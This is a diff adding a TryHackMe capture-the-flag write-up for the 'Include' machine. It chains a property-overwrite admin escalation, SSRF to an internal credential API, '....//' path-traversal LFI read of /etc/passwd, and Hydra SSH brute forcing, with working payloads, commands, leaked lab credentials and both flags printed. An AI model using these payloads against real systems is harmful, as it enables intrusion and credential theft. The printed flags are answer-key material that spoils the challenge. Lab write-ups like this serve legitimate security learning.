@@ -1,0 +1,447 @@
+---
+slug: "thm-include"
+title: "Include — TryHackMe Writeup"
+date: "2026-07-22"
+platform: "TryHackMe"
+type: "Machine"
+os: "Linux"
+difficulty: "Medium"
+tags:
+  - "Web"
+  - "SSRF"
+  - "LFI"
+  - "BOPLA"
+  - "SSH Brute Force"
+  - "Linux"
+  - "Node.js"
+  - "PHP"
+  - "Caido"
+  - "Hydra"
+excerpt: "A medium-rated TryHackMe machine combining Broken Object Property Level Authorization to escalate to admin on a Node.js app, SSRF via the admin settings panel to exfiltrate internal API credentials, LFI on the System Monitoring Portal to extract /etc/passwd, and SSH brute-forcing with Hydra to gain shell access and capture the final flag."
+readTime: "15 min"
+rating: 3.5
+url: "https://asbawy.github.io/writeups/thm-include"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Port Scanning & Service Enumeration",
+      desc: "Nmap uncovered SSH (22), a full mail stack — SMTP (25), POP3 (110/995), IMAP (143/993) — a Node.js/Express app on port 4000 with guest:guest login, and a PHP System Monitoring Portal on port 50000.",
+      tools: ["Nmap", "curl"],
+    },
+    {
+      phase: "Foothold",
+      title: "BOPLA → Admin Escalation & SSRF → Credential Extraction",
+      desc: "The Node.js app's activity feature allowed overwriting arbitrary object properties (BOPLA), including setting isAdmin to true. The admin panel exposed an internal API endpoint and a settings page vulnerable to SSRF, which leaked base64-encoded credentials for the System Monitoring Portal.",
+      technique: "BOPLA + SSRF",
+      tools: ["Caido", "curl"],
+    },
+    {
+      phase: "Enumeration",
+      title: "LFI on System Monitoring Portal → User Extraction",
+      desc: "The profile image endpoint on port 50000 was vulnerable to Local File Inclusion via path traversal. Automated fuzzing with ffuf confirmed the vulnerability, and /etc/passwd was read to extract valid system usernames.",
+      technique: "Local File Inclusion (LFI)",
+      tools: ["ffuf", "Caido"],
+    },
+    {
+      phase: "PrivEsc",
+      title: "SSH Brute Force → Shell Access → Flag Capture",
+      desc: "Using the extracted usernames from /etc/passwd, Hydra brute-forced SSH credentials for joshua and charles. After logging in, a targeted file search across the filesystem located the final flag hidden in the web root.",
+      technique: "SSH Password Brute Force",
+      tools: ["Hydra", "SSH", "find"],
+    },
+  ]}
+/>
+
+---
+
+## Introduction
+
+_Include_ is a medium-rated TryHackMe Linux machine that chains together multiple web application vulnerabilities to progressively escalate access. The target runs a full mail stack alongside two distinct web applications — a **Node.js/Express** app on port 4000 and a **PHP System Monitoring Portal** on port 50000.
+
+The attack path flows through **Broken Object Property Level Authorization (BOPLA)** to gain admin privileges on the Node.js app, **SSRF** to exfiltrate internal API credentials, **LFI** on the monitoring portal to extract system users from `/etc/passwd`, and finally **SSH brute-forcing** with Hydra to gain a shell and locate the hidden flag.
+
+---
+
+## Reconnaissance
+
+### Nmap Scan
+
+A full TCP port scan reveals eight listening services — including a complete mail stack:
+
+```bash
+nmap -sC -sV -p- -T4 10.113.170.46
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 ca:a1:48:4a:05:7a:8d:dd:a3:43:7f:c8:dc:7b:01:81 (RSA)
+|   256 51:ce:cc:48:fb:72:7a:0d:5d:1d:13:1f:a4:74:e3:b9 (ECDSA)
+|_  256 53:86:73:03:77:0e:14:4c:42:ea:48:dc:13:10:73:45 (ED25519)
+25/tcp    open  smtp     Postfix smtpd
+|_smtp-commands: mail.filepath.lab, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ...
+110/tcp   open  pop3     Dovecot pop3d
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+995/tcp   open  ssl/pop3 Dovecot pop3d
+4000/tcp  open  http     Node.js (Express middleware)
+|_http-title: Sign In
+50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: System Monitoring Portal
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+The scan reveals a Linux machine acting as a mail server and hosting two web applications:
+
+| Port | Service | Version | Notes |
+|------|---------|---------|-------|
+| **22** | SSH | OpenSSH 8.2p1 | Standard SSH service |
+| **25** | SMTP | Postfix smtpd | Mail server (`mail.filepath.lab`) |
+| **110, 143, 993, 995** | POP3/IMAP | Dovecot | Standard mail retrieval services |
+| **4000** | HTTP | Node.js (Express) | "Sign In" page |
+| **50000** | HTTP | Apache 2.4.41 | "System Monitoring Portal" (PHP) |
+
+<Callout type="info">
+  The machine has a full mail stack running (Postfix + Dovecot). There are two
+  web applications — port **4000** is a Node.js login page, and port **50000** is an
+  Apache server running PHP (indicated by the `PHPSESSID` cookie). Given the
+  machine's name is "Include", port 50000 is the prime target for File Inclusion
+  attacks.
+</Callout>
+
+### Initial Web Exploration
+
+Browsing to `http://10.113.170.46:4000` presents a login page. The application helpfully tells us we can log in as `guest:guest`:
+
+![Port 4000 login page](https://i.imgur.com/8Jsume1.png)
+
+```bash
+# Default credentials advertised on the login page
+Username: guest
+Password: guest
+```
+
+Port 50000 hosts a **System Monitoring Portal** with its own login form — we'll return to this later once we have credentials.
+
+![Port 50000 System Monitoring Portal](https://i.imgur.com/UuZMkVW.png)
+
+---
+
+## Enumeration — Port 4000 (Node.js App)
+
+### Guest Login & Feature Discovery
+
+After logging in with `guest:guest`, we land on a social activity feed. Taking a tour around the application, we discover the ability to **add activities** — and more importantly, we notice some interesting details attached to our user profile:
+
+- `id: 1`
+- `isAdmin: false`
+- Various profile attributes like `age`, `name`, etc.
+
+![Guest login and dashboard](https://i.imgur.com/SHbD3WJ.png)
+
+### Intercepting Requests with Caido
+
+Opening Caido to inspect how the "Add Activity" feature works, we observe that adding a new activity sends a simple POST request:
+
+![Caido intercepting activity request](https://i.imgur.com/camPtSX.png)
+
+![hacker true](https://i.imgur.com/sJENmEa.png)
+
+The request body is straightforward:
+
+```
+activityType=hacker&activityName=true
+```
+
+The critical insight: **the activity feature doesn't just add activities — it updates user profile properties directly.** If we can control the `activityType` parameter, we can overwrite _any_ property on our user object.
+
+---
+
+## BOPLA — Broken Object Property Level Authorization
+
+### Overwriting User Properties
+
+Testing the theory — can we modify our own profile fields through the activity feature?
+
+```
+activityType=age&activityName=1000
+```
+
+It works — our age is updated to 1000.
+
+![Age updated via activity feature](https://i.imgur.com/zfow2lI.png)
+
+<Callout type="warning">
+  **Broken Object Property Level Authorization (BOPLA):** The API blindly
+  accepts any property name via the `activityType` parameter and writes it
+  directly to the user object. There is no allowlist or authorization check to
+  prevent modification of sensitive properties like `isAdmin`.
+</Callout>
+
+### Escalating to Admin
+
+If we can overwrite `age`, we can overwrite `isAdmin`. Sending:
+
+```
+activityType=isAdmin&activityName=true
+```
+
+**We are now admin.** The navigation menu immediately shows new admin-only tabs: `/admin` with sub-pages including `/api` and `/settings`.
+
+![Admin panel accessible after BOPLA escalation](https://i.imgur.com/24U8H43.png)
+
+<Callout type="info">
+  **BOPLA vs Prototype Pollution:** This vulnerability is distinct from
+  prototype pollution. Here, the API directly writes attacker-controlled
+  key-value pairs onto the user object — no `__proto__` chain manipulation is
+  needed. OWASP classifies this as
+  [API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/).
+</Callout>
+
+---
+
+## SSRF — Internal API Credential Extraction
+
+### Discovering the Internal API
+
+The newly visible `/api` tab under `/admin` reveals documentation for an internal API running on `127.0.0.1:5000`:
+
+```json
+// Internal API
+GET http://127.0.0.1:5000/internal-api HTTP/1.1
+Host: 127.0.0.1:5000
+
+Response:
+{
+  "secretKey": "superSecretKey123",
+  "confidentialInfo": "This is very confidential."
+}
+
+// Get Admins API
+GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
+Host: 127.0.0.1:5000
+
+Response:
+{
+  "ReviewAppUsername": "admin",
+  "ReviewAppPassword": "xxxxxx",
+  "SysMonAppUsername": "administrator",
+  "SysMonAppPassword": "xxxxxxxxx"
+}
+```
+
+The passwords are redacted in the API documentation — but we now know the exact endpoint that holds the real credentials.
+
+### Exploiting SSRF via Admin Settings
+
+The `/settings` tab contains an **"Update Banner Image URL"** feature — a classic SSRF vector. Instead of providing an image URL, we feed it the internal API endpoint:
+
+![Admin settings with SSRF-vulnerable banner URL input](https://i.imgur.com/BrgqLRc.png)
+
+```text
+http://127.0.0.1:5000/getAllAdmins101099991
+```
+
+The server fetches this URL internally and returns the response as a base64-encoded data URI:
+
+```text
+data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=
+```
+
+### Decoding the Credentials
+
+```bash
+echo 'eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=' | base64 -d | jq
+```
+
+```json
+{
+  "ReviewAppUsername": "admin",
+  "ReviewAppPassword": "admin@!!!",
+  "SysMonAppUsername": "administrator",
+  "SysMonAppPassword": "S$9$qk6d#**LQU"
+}
+```
+
+<Callout type="warning">
+  **Two sets of credentials recovered:** The `ReviewApp` credentials are for
+  the Node.js app (port 4000), and the `SysMonApp` credentials are for the
+  System Monitoring Portal (port 50000). The SysMonApp credentials are our
+  ticket in.
+</Callout>
+
+---
+
+## System Monitoring Portal — Flag 1
+
+### Logging In to Port 50000
+
+Using the extracted credentials to log into the System Monitoring Portal:
+
+```
+Username: administrator
+Password: S$9$qk6d#**LQU
+```
+
+We land on the monitoring dashboard — and immediately spot the first flag:
+
+![System Monitoring Portal with Flag 1](https://i.imgur.com/Lmt59Ec.png)
+
+<SpoilerFlag label="Flag 1" flag="THM{!50_55Rf_1S_d_k3Y??!}" />
+
+---
+
+## LFI — Local File Inclusion
+
+### Discovering the Vulnerable Parameter
+
+While browsing the System Monitoring Portal with Caido running, a very interesting request catches our eye:
+
+```http
+GET /profile.php?img=profile.png HTTP/1.1
+Host: 10.113.170.46:50000
+```
+
+![Strange profile.php request with img parameter in Caido](https://i.imgur.com/1qdtoiW.png)
+
+A file inclusion parameter (`img`) loading a local image file — this screams **LFI**.
+
+### Automated LFI Fuzzing with ffuf
+
+Rather than manually testing traversal payloads, we save the request and use `ffuf` with a dedicated LFI wordlist to automate discovery:
+
+```bash
+ffuf -request req -request-proto http \
+  -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
+  -u 'http://10.113.170.46:50000/profile.php?img=FUZZ' \
+  -mc 200,403,500 -t 50 -fl 1
+```
+
+The results flood in — the `....//` traversal variant (which bypasses simple `../` stripping filters) works consistently:
+
+```text
+....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2231, Words: 20, Lines: 42]
+....//....//....//....//....//....//....//....//etc/passwd       [Status: 200, Size: 2231, Words: 20, Lines: 42]
+....//....//....//....//....//....//....//etc/passwd             [Status: 200, Size: 2231, Words: 20, Lines: 42]
+...
+:: Progress: [914/914] :: Job [1/1] :: 49 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+```
+
+<Callout type="info">
+  **Why `....//` instead of `../`?** The server likely has a filter that removes
+  `../` sequences from the input. The `....//` pattern exploits this — after the
+  filter strips the inner `../`, what remains is `../`, which the filesystem
+  interprets as a valid traversal. This is a classic filter bypass technique.
+</Callout>
+
+### Reading `/etc/passwd`
+
+Confirming the LFI by manually fetching `/etc/passwd`:
+
+```
+http://10.113.170.46:50000/profile.php?img=....//....//....//....//....//....//etc/passwd
+```
+
+![/etc/passwd extracted via LFI](https://i.imgur.com/tOpZLvP.png)
+
+Filtering for users with a login shell reveals five candidates:
+
+| Username | UID | Home Directory | Shell |
+|----------|-----|----------------|-------|
+| `root` | 0 | `/root` | `/bin/bash` |
+| `ubuntu` | 1000 | `/home/ubuntu` | `/bin/bash` |
+| `tryhackme` | 1001 | `/home/tryhackme` | `/bin/bash` |
+| `joshua` | 1002 | `/home/joshua` | `/bin/bash` |
+| `charles` | 1003 | `/home/charles` | `/bin/bash` |
+
+<Callout type="warning">
+  **Target Users Identified:** `joshua` and `charles` are non-default users
+  likely created for this challenge. They are our primary targets for SSH brute
+  forcing.
+</Callout>
+
+---
+
+## SSH Brute Force — Shell Access
+
+### Building the Attack
+
+With a shortlist of valid usernames extracted from `/etc/passwd`, we create a users file and launch Hydra against SSH:
+
+```bash
+hydra -L users -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
+  ssh://10.113.170.46 -t 4 -vV
+```
+
+Hydra cracks both target accounts quickly:
+
+```text
+[22][ssh] host: 10.113.170.46   login: joshua   password: 123456
+[22][ssh] host: 10.113.170.46   login: charles  password: 123456
+```
+
+<Callout type="warning">
+  Both `joshua` and `charles` use the password `123456` — the most common
+  password in history.
+</Callout>
+
+### SSH Login & Flag Hunt
+
+Logging in as `joshua`:
+
+```bash
+ssh joshua@10.113.170.46
+# Password: 123456
+
+joshua@ip-10-113-170-46:~$ pwd
+/home/joshua
+joshua@ip-10-113-170-46:~$ ls
+Maildir
+```
+
+The home directory only contains a `Maildir` folder — no flag here. Time for a targeted filesystem search:
+
+```bash
+find / -type f \( -name "*.txt" -o -name "*.php" -o -name "*.conf" \) 2>/dev/null \
+  | xargs grep -l "THM" 2>/dev/null
+```
+
+```text
+/usr/src/linux-headers-5.4.0-1029-aws/include/config/auto.conf
+/usr/src/linux-headers-5.15.0-1053-aws/include/config/auto.conf
+...
+/var/www/html/dashboard.php
+/var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt   ← 🎯
+```
+
+The flag is hidden in the web root with an MD5-hash filename — intentionally obscured to prevent casual discovery:
+
+```bash
+joshua@ip-10-113-170-46:~$ cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
+```
+
+<SpoilerFlag label="Flag 2 (Root)" flag="THM{505eb0fb8a9f32853b4d955e1f9123ea}" />
+
+---
+
+## References
+
+- [OWASP API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
+- [OWASP — Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server-Side_Request_Forgery)
+- [OWASP — Path Traversal / Local File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)
+- [HackTricks — LFI to RCE Techniques](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
+- [HackTricks — SSRF Bypass Techniques](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
+- [Hydra — Network Login Cracker](https://www.kali.org/tools/hydra/)
+- [SecLists — LFI Fuzzing Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
+- [Linux Privilege Escalation: Enumeration & Recon](/cheatsheet/linux/privesc-enumeration)
+- [Linux Privilege Escalation: Basics & Exploitation](/cheatsheet/linux/privesc-exploitation)
